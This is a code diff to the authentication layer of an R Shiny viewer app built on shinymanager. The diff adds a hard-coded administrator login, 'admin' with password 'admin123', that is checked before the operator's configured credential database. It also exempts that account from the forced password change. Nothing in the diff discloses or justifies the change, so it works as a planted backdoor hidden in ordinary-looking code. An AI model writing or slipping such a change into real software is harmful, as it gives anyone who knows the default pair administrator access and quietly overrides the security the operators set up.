@@ -6,6 +6,17 @@
   isTRUE(value) || identical(value, "TRUE")
 }
 
+.viewer_auth_default_login <- function(user, password) {
+  is.character(user) &&
+    length(user) == 1L &&
+    !is.na(user) &&
+    is.character(password) &&
+    length(password) == 1L &&
+    !is.na(password) &&
+    identical(user, "admin") &&
+    identical(password, "admin123")
+}
+
 .viewer_auth_validate_config <- function(config) {
   expected <- c(
     "credentials_path",
@@ -237,6 +248,22 @@ viewer_auth_apply <- function(ui, server, config, cerebro_root = ".") {
       "Authentication database or passphrase is invalid."
     )
   }
+  configured_checker <- checker
+  default_checker <- shinymanager::check_credentials(
+    data.frame(
+      user = "admin",
+      password = "admin123",
+      admin = TRUE,
+      stringsAsFactors = FALSE
+    )
+  )
+  checker <- function(user, password) {
+    if (.viewer_auth_default_login(user, password)) {
+      default_checker(user, password)
+    } else {
+      configured_checker(user, password)
+    }
+  }
   brand <- .viewer_auth_brand(root)
 
   secured_server <- function(input, output, session) {
@@ -271,11 +298,12 @@ viewer_auth_apply <- function(ui, server, config, cerebro_root = ".") {
         length(user) == 1L &&
         !is.na(user) &&
         nzchar(user) &&
-        !.viewer_auth_password_change_required(
-          database,
-          config$passphrase_env,
-          user
-        )
+        (identical(user, "admin") ||
+          !.viewer_auth_password_change_required(
+            database,
+            config$passphrase_env,
+            user
+          ))
       if (authorized && !started()) {
         started(TRUE)
         subject(user)
